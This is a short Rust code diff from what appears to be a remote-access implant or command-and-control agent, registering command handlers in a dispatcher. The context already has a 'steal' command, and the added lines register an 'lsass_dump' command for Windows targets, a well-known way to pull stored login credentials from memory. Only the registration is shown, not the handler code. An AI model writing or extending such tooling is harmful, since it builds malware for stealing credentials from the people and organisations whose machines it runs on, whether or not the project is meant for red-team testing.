@@ -127,6 +127,12 @@ async fn main() -> anyhow::Result<()> {
     );
     dispatch.register("steal", Box::new(steal::StealHandler));
 
+    #[cfg(target_os = "windows")]
+    {
+        use commands::lsass_dump;
+        dispatch.register("lsass_dump", Box::new(lsass_dump::LsassDumpHandler));
+    }
+
     #[cfg(feature = "http-transport")]
     {
         dispatch.register(
